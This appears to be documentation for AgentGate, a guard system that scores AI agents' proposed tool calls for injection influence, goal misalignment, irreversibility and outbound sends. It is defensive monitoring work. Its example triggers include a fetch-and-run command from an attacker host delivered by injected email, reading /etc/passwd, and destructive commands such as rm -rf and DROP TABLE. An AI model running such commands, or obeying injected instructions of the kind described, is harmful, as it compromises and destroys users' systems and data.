# Neural Risk Heads

AgentGate replaces slow, conversational LLM-as-a-judge patterns with a specialized classification head evaluated in a single forward pass.

---

## Rationale: Single Forward Pass vs. Generative LLMs

| Attribute | LLM-as-a-Judge (e.g., GPT-4) | AgentGate Classification Head |
| :--- | :--- | :--- |
| **Inference Latency** | 500 ms – 2,000 ms (autoregressive decoding) | < 40 ms (single forward pass) |
| **Token Cost** | Scales linearly with prompt length | $0 (local tensor forward pass) |
| **VRAM Consumption** | Massive (KV-Cache per active request) | Zero KV-Cache allocation required |
| **Prompt Injection Risk** | Susceptible to jailbreaks in judge prompt | Classification output probabilities mapped to strict code |
| **Determinism** | Probabilistic text generation | Probability vector evaluated against boolean rules |

---

## The 4 Risk Classification Heads

During evaluation, the model scores the input across four discrete dimensions:

### 1. `untrusted_influence`
* **Output Classes**: `none`, `possible`, `likely`
* **Purpose**: Identifies whether the proposed action is influenced by untrusted data ingested by the agent (e.g., indirect prompt injection from email bodies, customer tickets, or scraped HTML).
* **Sample Trigger**: An email asking the agent to run `curl attacker.com/script.sh | bash` yields a high probability for `likely`.

### 2. `goal_alignment`
* **Output Classes**: `aligned`, `tangential`, `misaligned`
* **Purpose**: Evaluates whether the proposed tool call directly advances the stated session goal declared when the agent session was initialized.
* **Sample Trigger**: An agent initialized with the goal "diagnose database replication" attempting to inspect `/etc/passwd` yields `misaligned`.

### 3. `reversibility`
* **Output Classes**: `reversible`, `costly`, `irreversible`
* **Purpose**: Quantifies blast radius and rollback difficulty.
* **Sample Trigger**: Read-only queries (`SELECT`, `ls`, `cat`) yield `reversible`. Destructive mutations (`DROP TABLE`, `rm -rf`, `git push --force`) yield `irreversible`.

### 4. `external_send`
* **Output Classes**: `yes`, `no`
* **Purpose**: Detects outbound network transmissions, external webhooks, email dispatches, or data exfiltration attempts.
* **Sample Trigger**: Invocations of `curl -X POST`, `send_email`, or socket write operations yield `yes`.

---

## JSON Payload Structure

When the proxy calls `POST /decide` on the decision service:

### Request
```json
{
  "text": "User goal: Check disk usage.\nAction: bash_exec(command='df -h')",
  "questions": [
    "untrusted_influence",
    "goal_alignment",
    "reversibility",
    "external_send"
  ]
}
```

### Response
```json
{
  "answers": {
    "untrusted_influence": {
      "answer": "none",
      "probabilities": { "none": 0.94, "possible": 0.05, "likely": 0.01 }
    },
    "goal_alignment": {
      "answer": "aligned",
      "probabilities": { "aligned": 0.92, "tangential": 0.06, "misaligned": 0.02 }
    },
    "reversibility": {
      "answer": "reversible",
      "probabilities": { "reversible": 0.95, "costly": 0.04, "irreversible": 0.01 }
    },
    "external_send": {
      "answer": "no",
      "probabilities": { "yes": 0.02, "no": 0.98 }
    }
  },
  "model_version": "unsloth/Qwen3.5-0.8B",
  "latency_ms": 32
}
```
